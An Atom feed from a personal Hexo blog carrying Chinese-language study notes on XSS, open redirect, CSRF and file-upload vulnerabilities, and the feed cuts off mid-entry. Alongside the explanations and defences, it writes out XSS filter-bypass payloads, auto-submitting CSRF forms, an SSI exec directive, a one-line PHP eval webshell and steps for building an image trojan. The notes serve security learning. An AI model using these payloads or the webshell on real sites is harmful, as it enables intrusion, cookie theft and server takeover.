<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>My blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-06-13T04:06:09.504Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>keikei</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>xss漏洞</title>
    <link href="http://example.com/2021/06/13/xss%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/06/13/xss%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-06-13T04:01:00.443Z</published>
    <updated>2021-06-13T04:06:09.504Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><h3 id="1-漏洞原理："><a href="#1-漏洞原理：" class="headerlink" title="1.漏洞原理："></a>1.漏洞原理：</h3><p>恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p><h3 id="2-漏洞类型："><a href="#2-漏洞类型：" class="headerlink" title="2.漏洞类型："></a>2.漏洞类型：</h3><p>1.反射型xss<br>2.存储型xss<br>3.dom型xss<br>4.self-xss</p><h3 id="3-攻击方式："><a href="#3-攻击方式：" class="headerlink" title="3.攻击方式："></a>3.攻击方式：</h3><p>XSS的攻击方式就是想办法“<strong>教唆</strong>”用户的浏览器去执行一些这个网页中原本不存在的前端代码。</p><h3 id="4-xss漏洞能做什么"><a href="#4-xss漏洞能做什么" class="headerlink" title="4.xss漏洞能做什么"></a>4.xss漏洞能做什么</h3><p><img src="/.com//xss%E5%8D%B1%E5%AE%B3.png"></p><p><strong>1.盗取cookie</strong>：盗取cookie可以无密码登录，拿到管理员cookie还可以直接进后台</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">js代码：</span><br><span class="line">&lt;script&gt;</span><br><span class="line">alert(<span class="built_in">document</span>.cookie);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>绕过</strong>：cookie有其他验证措施如：Http-Only保证同一cookie不能被滥用</p><p><strong>2.劫持流量实现恶意跳转</strong></p><p>在网页中插入这样一句话,访问网页，就直接跳到百度</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">window</span>.location.href=<span class="string">&quot;http://www.baidu.com&quot;</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>蠕虫病毒：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如看到一篇帖子，就会转发那个帖子，一传二，二传三</span><br></pre></td></tr></table></figure><h3 id="5-xss漏洞绕过过滤方法"><a href="#5-xss漏洞绕过过滤方法" class="headerlink" title="5.xss漏洞绕过过滤方法"></a>5.xss漏洞绕过过滤方法</h3><h4 id="1-大小写绕过"><a href="#1-大小写绕过" class="headerlink" title="1.大小写绕过"></a>1.大小写绕过</h4><p>这个绕过方式的出现是因为网站仅仅只过滤了<script>标签，而没有考虑标签中的大小写并不影响浏览器的解释所致。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">例如:</span><br><span class="line">&lt;sCript&gt;alert();&lt;/sCript&gt;</span><br></pre></td></tr></table></figure><h4 id="2-闭合符绕过"><a href="#2-闭合符绕过" class="headerlink" title="2.闭合符绕过"></a>2.闭合符绕过</h4><p>手动闭合两个双引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;&lt;script&gt;alert();&lt;/script&gt;;</span><br><span class="line">用&quot;;闭合两个双引号</span><br></pre></td></tr></table></figure><p>如果js代码被镶在网页的js代码中，可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;/script&gt;&lt;script&gt;alert();&lt;/script&gt;;</span><br></pre></td></tr></table></figure><h4 id="3-利用过滤后返回的语句再次构造攻击语句绕过"><a href="#3-利用过滤后返回的语句再次构造攻击语句绕过" class="headerlink" title="3.利用过滤后返回的语句再次构造攻击语句绕过"></a>3.利用过滤后返回的语句再次构造攻击语句绕过</h4><p>例如：过滤“<script>”中的尖括号过滤</p><p>则可以构造下列语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCri&lt;script&gt;pt&gt;alert(&quot;hey!&quot;)&lt;/scRi&lt;/script&gt;pt&gt;</span><br></pre></td></tr></table></figure><h4 id="4-并不是只有中可以插入代码"><a href="#4-并不是只有中可以插入代码" class="headerlink" title="4.并不是只有中可以插入代码"></a>4.并不是只有<script>中可以插入代码</h4><p>如果<script>被完全过滤，则可以考虑到的是，并不是只有<script>标签可以插入代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.102/xss/example4.php?name=&lt;img</span><br><span class="line">src=&#x27;w.123&#x27; onerror=&#x27;alert(&quot;hey!&quot;)&#x27;&gt;</span><br></pre></td></tr></table></figure><p>当指定的图片地址不存在，就会存在onerror中的语句</p><h4 id="5-编码脚本绕过关键字过滤"><a href="#5-编码脚本绕过关键字过滤" class="headerlink" title="5.编码脚本绕过关键字过滤"></a>5.编码脚本绕过关键字过滤</h4><p>有的时候，服务器往往会对代码中的关键字（如alert）进行过滤，这个时候我们可以尝试将关键字进行编码后再插入，不过直接显示编码是不能被浏览器执行的，我们可以用另一个语句eval（）来实现。**eval()**会将编码过的语句解码后再执行。</p><h3 id="6-反射型xss"><a href="#6-反射型xss" class="headerlink" title="6.反射型xss"></a>6.反射型xss</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">表现在我们把我们的恶意脚本通过url的方式传递给了服务器，而服务器则只是不加处理的把脚本“反射”回访问者的浏览器而使访问者的浏览器执行相应的脚本。</span><br></pre></td></tr></table></figure><p>要想触发xss漏洞，需要访问特定链接才能实现</p><p>可能发生的功能点：搜索</p><h3 id="7-存储型xss"><a href="#7-存储型xss" class="headerlink" title="7.存储型xss"></a>7.存储型xss</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">存储型xss：储存到数据库中，然后当我们再次访问相同页面时，将恶意脚本从数据库中取出并返回给浏览器执行。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。</span><br></pre></td></tr></table></figure><p>存储型xss往往会发生在和数据库交互的地方</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为存储型xss可能会获取管理员cookie，所以存储型xss会比反射型xss漏洞危害更大</span><br></pre></td></tr></table></figure></script></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XSS漏洞&quot;&gt;&lt;a href=&quot;#XSS漏洞&quot; class=&quot;headerlink&quot; title=&quot;XSS漏洞&quot;&gt;&lt;/a&gt;XSS漏洞&lt;/h1&gt;&lt;h3 id=&quot;1-漏洞原理：&quot;&gt;&lt;a href=&quot;#1-漏洞原理：&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>url跳转漏洞</title>
    <link href="http://example.com/2021/06/13/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/06/13/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-06-13T03:56:39.089Z</published>
    <updated>2021-06-13T03:58:01.944Z</updated>
    
    <content type="html"><![CDATA[<h1 id="URL（重定向）跳转漏洞"><a href="#URL（重定向）跳转漏洞" class="headerlink" title="URL（重定向）跳转漏洞"></a>URL（重定向）跳转漏洞</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL跳转漏洞：就是用户输入url地址，但是访问到攻击者控制的网站可能导致跳转过去的用户被精心设置的钓鱼页面骗走自己的个人信息和登录口令。</span><br></pre></td></tr></table></figure><h3 id="1-漏洞常发生的地方"><a href="#1-漏洞常发生的地方" class="headerlink" title="1.漏洞常发生的地方"></a>1.漏洞常发生的地方</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 用户登录、统一身份认证处，认证完后会跳转,在登陆处url地址中会有redirect=某个url,这样做是为了方便用户，不用登录完再去找登陆后的界面，但是如果这里的url不做任何限制，可能就会被攻击者攻击，登陆完跳到攻击者控制的页面</span><br><span class="line">2. 用户分享、收藏内容过后，会跳转</span><br><span class="line">3. 跨站点认证、授权后，会跳转</span><br><span class="line">4. 站内点击其它网址链接时，会跳转</span><br></pre></td></tr></table></figure><h3 id="2-常见参数名"><a href="#2-常见参数名" class="headerlink" title="2.常见参数名"></a>2.常见参数名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">redirect</span><br><span class="line">redirect_to</span><br><span class="line">redirect_url</span><br><span class="line">url</span><br><span class="line">jump</span><br><span class="line">jump_to</span><br><span class="line">target</span><br><span class="line">to</span><br><span class="line">link</span><br><span class="line">linkto</span><br><span class="line">domain</span><br></pre></td></tr></table></figure><h3 id="3-漏洞危害"><a href="#3-漏洞危害" class="headerlink" title="3.漏洞危害"></a>3.漏洞危害</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.钓鱼攻击</span><br><span class="line">2.逃逸安全检测：例如一些违法网站，如果网址直接可以跳转到违法页面，这种网站是会被封红，是无法直接访问，有些违法网站就会从一个绿色网站一步一步跳转到违法网站，也可以利用子域名逃逸安全检测（这个还不太明白）</span><br></pre></td></tr></table></figure><h3 id="5-白名单机制"><a href="#5-白名单机制" class="headerlink" title="5.白名单机制"></a>5.白名单机制</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在控制页面转向的地方校验传入url是否为可信域名，可以采用url白名单机制</span><br></pre></td></tr></table></figure><p><img src="/.com//url%E8%B7%B3%E8%BD%AC%E4%B8%AD%E7%9A%84%E7%99%BD%E5%90%8D%E5%8D%95.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用白名单缺陷绕过：</span><br><span class="line">1.白名单上的域名是不全的，比如如果想利用一个跳转，而这个跳转是通用，在这个公司网站很多子域名等都可以跳转，那么你买个域名也不算贵对吧。</span><br><span class="line">2.白名单只是判断域名中是否有白名单中的域名，而不是整个域名，例如白名单中aaa.com即可跳转，那testaaa.com也可以跳转，直接去注册一个域名不就得了</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;URL（重定向）跳转漏洞&quot;&gt;&lt;a href=&quot;#URL（重定向）跳转漏洞&quot; class=&quot;headerlink&quot; title=&quot;URL（重定向）跳转漏洞&quot;&gt;&lt;/a&gt;URL（重定向）跳转漏洞&lt;/h1&gt;&lt;figure class=&quot;highlight plaintex</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>csrf漏洞</title>
    <link href="http://example.com/2021/06/13/csrf%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/06/13/csrf%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-06-13T03:53:58.002Z</published>
    <updated>2021-06-13T03:55:20.658Z</updated>
    
    <content type="html"><![CDATA[<h1 id="csrf漏洞（点击劫持漏洞）"><a href="#csrf漏洞（点击劫持漏洞）" class="headerlink" title="csrf漏洞（点击劫持漏洞）"></a>csrf漏洞（点击劫持漏洞）</h1><h3 id="1-什么是csrf漏洞（点击劫持漏洞）"><a href="#1-什么是csrf漏洞（点击劫持漏洞）" class="headerlink" title="1.什么是csrf漏洞（点击劫持漏洞）"></a>1.什么是csrf漏洞（点击劫持漏洞）</h3><p>利用站点对已经身份认证的信任，在用户不知情的时候，去劫持用户的一些请求，比如跳转到某一钓鱼网站等等，利用用户的身份进行恶意操作（借用户权限完成攻击）<strong>所以在csrf漏洞中骗取用户信任也很重要</strong>，越容易让用户信任去点击，攻击的成功性就越高</p><p><img src="/.com//20200219221037596.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">验证csrf原理：要验证CSRF，需要在访问网站A后并获得cookie后，再访问一个会返回恶意代码的网站B，返回的恶意代码必须能导致浏览器访问网站A ，如果能通过返回的恶意代码访问到A，且A正常响应，说明存在CSRF漏洞。</span><br></pre></td></tr></table></figure><h3 id="2-csrf漏洞类型"><a href="#2-csrf漏洞类型" class="headerlink" title="2.csrf漏洞类型"></a>2.csrf漏洞类型</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.get请求：get请求更容易得到用户信任，比post更危险</span><br><span class="line">2.post请求：post请求相对信任度较低</span><br></pre></td></tr></table></figure><h4 id="1-get请求的csrf攻击（更容易被信任）"><a href="#1-get请求的csrf攻击（更容易被信任）" class="headerlink" title="1.get请求的csrf攻击（更容易被信任）"></a>1.get请求的csrf攻击（更容易被信任）</h4><p>get请求的csrf攻击只需要发送一个http请求</p><p>例如:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://wooyun.org/csrf?xx</span>=<span class="string">11</span> /&gt;</span> </span><br></pre></td></tr></table></figure><p>在访问含有这个img的页面后，成功向<a href="http://wooyun.org/csrf?xx=11">http://wooyun.org/csrf?xx=11</a> 发出了一次HTTP请求。所以，如果将该网址替换为存在GET型CSRF的地址，就能完成攻击了。</p><h4 id="2-post请求的csrf攻击"><a href="#2-post请求的csrf攻击" class="headerlink" title="2.post请求的csrf攻击"></a>2.post请求的csrf攻击</h4><p>这种类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的表单（与用户信任度有关）</p><p>1.打开页面无需点击。自动跳转</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">http://wooyun.org/csrf.php</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;xx&quot;</span> <span class="attr">value</span>=<span class="string">&quot;11&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> <span class="built_in">document</span>.forms[<span class="number">0</span>].submit(); &lt;<span class="regexp">/script  /</span><span class="regexp">/自动提交的表单（发送请求自动跳转到）,js脚本一句话的话可以不加“;”</span></span></span><br></pre></td></tr></table></figure><p>2.打开页面隐藏数据包成功状态</p><p>设置属性为width=0 height=0,就可以隐藏数据包返回数据</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;这里放一个图片的url&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srchttp:</span>//<span class="attr">wooyun.org</span>/<span class="attr">csrf</span>?<span class="attr">xx</span>=<span class="string">11</span> <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-csrf漏洞挖掘"><a href="#3-csrf漏洞挖掘" class="headerlink" title="3.csrf漏洞挖掘"></a>3.csrf漏洞挖掘</h3><p>1.判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。</p><p>2.csrf漏洞往往存在于能够越权的地方</p><h3 id="4-burp验证csrf原理"><a href="#4-burp验证csrf原理" class="headerlink" title="4.burp验证csrf原理"></a>4.burp验证csrf原理</h3><h4 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">burp把自己当成恶意服务器，当用户通过访问可信任浏览器访问burp(恶意服务器)，burpsuite返回给浏览器的代码中含有要求访问可信任网站的代码，如果用户点击能够成功访问受信任网站，则说明存在csrf漏洞![](csrf漏洞.assets/burp验证1.PNG</span><br></pre></td></tr></table></figure><h3 id="5-漏洞危害"><a href="#5-漏洞危害" class="headerlink" title="5.漏洞危害"></a>5.漏洞危害</h3><p>漏洞危害取决于你修改/添加/删除的是什么数据</p><h3 id="6-漏洞修复"><a href="#6-漏洞修复" class="headerlink" title="6.漏洞修复"></a>6.漏洞修复</h3><h4 id="1-referer验证"><a href="#1-referer验证" class="headerlink" title="1.referer验证"></a>1.referer验证</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">referer代表着请求的来源，不可以伪造,但是浏览器可以关闭referer，但是火狐已经可以篡改referer</span><br><span class="line">//referer和origin的区别，只有post请求会携带origin请求头，而referer不论何种情况下都带。</span><br></pre></td></tr></table></figure><p>在服务器端的http header中的referer字段，服务器判断referer是否是自己的站点，如果不是则拒绝服务。</p><h4 id="2-token校验"><a href="#2-token校验" class="headerlink" title="2.token校验"></a>2.token校验</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token有些像验证码，但是有些网站的token是摆设，要抓包看token是否有效</span><br></pre></td></tr></table></figure><p><strong>1.token校验原理</strong>后端生成一个token放在session中并发给前端，前端发送请求时携带这个token，后端通过校验这个token和session中的token是否一致判断是否是本网站的请求。</p><h3 id><a href="#" class="headerlink" title></a></h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;csrf漏洞（点击劫持漏洞）&quot;&gt;&lt;a href=&quot;#csrf漏洞（点击劫持漏洞）&quot; class=&quot;headerlink&quot; title=&quot;csrf漏洞（点击劫持漏洞）&quot;&gt;&lt;/a&gt;csrf漏洞（点击劫持漏洞）&lt;/h1&gt;&lt;h3 id=&quot;1-什么是csrf漏洞（点击劫持漏</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="http://example.com/2021/06/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/06/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-06-13T03:50:32.222Z</published>
    <updated>2021-06-13T03:59:26.213Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>“基本上所有的站，脚本类型文件后缀都不能上传”</p><h3 id="1-文件上传漏洞形成要素"><a href="#1-文件上传漏洞形成要素" class="headerlink" title="1.文件上传漏洞形成要素"></a>1.文件上传漏洞形成要素</h3><p>1.检查上传功能是否完整：文件是否能被上传到服务器</p><p>2.上传后是否能找到相对路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">动态路径：</span><br><span class="line">脏数据报错：给他错误数据看返回包，有可能返回真正相对路径</span><br></pre></td></tr></table></figure><p>3.文件后缀必须为脚本后缀</p><p>4.文件内容必须被解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">什么是附件存储服务器：</span><br></pre></td></tr></table></figure><p>SSI指令：通过在文档中加入SSI指令，让服务器端在输出文档之前解析SSI指令，并把解析完的结果和文档一同输出给客户端。</p><p>如何用通过上传shtml文件执行cmd文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.上传一个.bat后缀的文件（windows中执行cmd命令的文件后缀），.bat文件中写入一段cmd命令，</span><br><span class="line">2.上传一个.shtml后缀文件，用于执行.bat文件的命令（&lt;!--#echo var=&quot;文件名&quot;--&gt;）</span><br><span class="line">3.也可以直接把cmd命令写入文件</span><br><span class="line">&lt;!--#exec cmd=&quot;&quot;...&quot;&quot;--&gt;（会执行给定的 shell 命令）</span><br></pre></td></tr></table></figure><h3 id="2-文件上传漏洞前后端验证方式及绕过方式"><a href="#2-文件上传漏洞前后端验证方式及绕过方式" class="headerlink" title="2.文件上传漏洞前后端验证方式及绕过方式"></a>2.文件上传漏洞前后端验证方式及绕过方式</h3><h4 id="1-前端验证："><a href="#1-前端验证：" class="headerlink" title="1.前端验证："></a>1.前端验证：</h4><p>这类验证主要时通过前端js验证文件后缀，没有把文件发给服务端验证，所以一般没有发包给服务端</p><p><strong>判断方式</strong>：在浏览加载文件，但<strong>还未点击上传按钮时便弹出对话框</strong>，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，<strong>而此时并没有发送数据包。</strong></p><p><strong>绕过方式</strong></p><p>1.禁用js</p><p>2.审查源码，删除对应验证的js代码</p><h4 id="2-后端验证"><a href="#2-后端验证" class="headerlink" title="2.后端验证"></a>2.后端验证</h4><p>1.content-type类型判断：MIME类型判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">常见MIME类型</span><br><span class="line">text/plain（纯文本）</span><br><span class="line">text/html（HTML文档）</span><br><span class="line">text/javascript（js代码）</span><br><span class="line">application/xhtml+xml（XHTML文档）</span><br><span class="line">image/gif（GIF图像）</span><br><span class="line">image/jpeg（JPEG图像）</span><br><span class="line">image/png（PNG图像）</span><br><span class="line">video/mpeg（MPEG动画）</span><br><span class="line">application/octet-stream（二进制数据）</span><br><span class="line">application/pdf（PDF文档）</span><br></pre></td></tr></table></figure><p>2.后缀黑名单,白名单校验</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.白名单几乎绕不过</span><br><span class="line">2.如何判断时黑名单校验</span><br><span class="line">抓包，修改文件后缀，随便修改一个不存在的文件后缀，如果能够上传成功，就说明是黑名单校验</span><br></pre></td></tr></table></figure><p>3.waf校验</p><p>WAF校验，即使用不同的WAF产品来进行过滤，通常是独立与服务程序的一段中间程序或者硬件</p><p>安全狗，火绒，D盾之类的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这些杀软，通常会有病毒库，一般会手机网上出现过的一些病毒</span><br></pre></td></tr></table></figure><p>所以要想免杀，自己写的，不是病毒库里的病毒概率很高</p><p>4.正则匹配判断</p><p>通过自己写正则匹配来判断文件幻数(文件头)内容是否符合要求，一般来说属于白名单的检测，常见的文件头（文件头标志位）如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.JPEG;.JPE;.JPG，”JPGGraphicFile”（FFD8FFFE00）</span><br><span class="line">2.gif，”GIF89A”（474946383961）</span><br><span class="line">3.zip，”ZipCompressed”（504B0304）</span><br><span class="line">4.doc;.xls;.xlt;.ppt;.apr，”MSCompoundDocumentv1orLotusApproachAPRfile”（D0CF11E0A1B11AE1</span><br></pre></td></tr></table></figure><p>5.文件加载检测</p><p>一般是调用API或函数去进行文件加载测试，例如图像渲染测试，当测试结果正常的时候才允许上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.一次渲染（代码注入）</span><br><span class="line">2.二次渲染:攻击方式是攻击文件加载器自身</span><br></pre></td></tr></table></figure><h3 id="3-一句话木马，小马，大马"><a href="#3-一句话木马，小马，大马" class="headerlink" title="3.一句话木马，小马，大马"></a>3.一句话木马，小马，大马</h3><p><strong>一句话木马详解</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;连接菜刀的密码&#x27;]); ?&gt;</span><br><span class="line">@：意思是不报错，即使执行错误，也不报错。</span><br><span class="line">eval:把字符串作为PHP代码执行。</span><br><span class="line">$_POST[&#x27;a&#x27;]; 的意思就是a这个变量，用post的方法接收。</span><br><span class="line">（get与post传输数据的方式：post是在消息体存放数据，get是在消息头的url路径里存放数据）</span><br><span class="line">所以一句话的意思是：用post方法接收变量pw，把变量pw里面的字符串当做php代码来执行。</span><br></pre></td></tr></table></figure><p>所以你想执行什么代码，就把代码放入<strong>连接菜刀的密码</strong>这个变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">oepndir,readdir(dir是目录),move_uploaded_file,如果执行cmd命令，用exec（）</span><br><span class="line">执行这些函数需要把php配置文件php.ini里，关掉安全模式safe_mode = off，然后再看看 禁用函数列表 disable_functions = proc_open, popen, exec, system, shell_exec ，把exec去掉，确保没有exec（有些cms为了方便处理某些功能，会去掉的）。</span><br></pre></td></tr></table></figure><p>参考链接</p><p>[<a href="https://blog.csdn.net/weixin_39190897/article/details/86772765]">https://blog.csdn.net/weixin_39190897/article/details/86772765]</a>: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">概括：</span><br><span class="line">一句话木马：通常只有一句话，隐蔽性强，可以单独成为一个文件，也可以放入其他文件，例如文件木马</span><br><span class="line">小马:只有一个功能点的木马，通常是为了上传大马，大马通常很大，一般文件上传处都有文件大小限制，或者留个后门给日后方便提权，通常只包含文件上传功能</span><br><span class="line">大马：体积大，包含功能多，包括对数据的管理，命令的操作，数据库的管理，解压缩，和提权等功能这种大马一旦网，站被种了，网站基本就在这个大马控制之中。大马的隐蔽性不好，因为涉及很多敏感代码，容易被杀掉</span><br></pre></td></tr></table></figure><h4 id="1-webshell"><a href="#1-webshell" class="headerlink" title="1.webshell:"></a>1.webshell:</h4><p>以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门，通常会将后门文件与正常文件混在一起，当在网页访问这个文件的时候，就可以得到一个命令执行环境，这样就可以达到控制服务器的目的</p><h3 id="4-文件上传漏洞配合文件解析漏洞"><a href="#4-文件上传漏洞配合文件解析漏洞" class="headerlink" title="4.文件上传漏洞配合文件解析漏洞"></a>4.文件上传漏洞配合文件解析漏洞</h3><h4 id="1-php图片木马"><a href="#1-php图片木马" class="headerlink" title="1.php图片木马"></a>1.php图片木马</h4><p>若规定是上传的图片，还会对图片进行采集。即使攻击者修改文件类型，也过不了图片采集那一关。所以，这就需要一张图片来做掩护。做成隐藏在图片下的木马。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php中getimagesize（）函数：返回一个数组元素，其中包含图像的高度，宽度，类型，MIME类型等。</span><br></pre></td></tr></table></figure><p>&lt;1&gt;.制作图片木马</p><p>（1）在一个路径创建一个a.jpg图片文件和一个b.php的一句话木马文件</p><p>（2）打开cmd命令行，打开文件所在路径，输入命令copy a.jpg/b+b.php tmp.jpg(这是两个文件合成以后的文件名)</p><p><strong>注意：1.图片文件名称一定要先敲，代码文件名称一定要放后面.</strong></p><p>​            <strong>2.图片文件名称一定接“/b”，“/b”代表这是一个二进制文件.</strong></p><p>（3）用notepad++打开合成的图片马</p><h4 id="2-解析漏洞"><a href="#2-解析漏洞" class="headerlink" 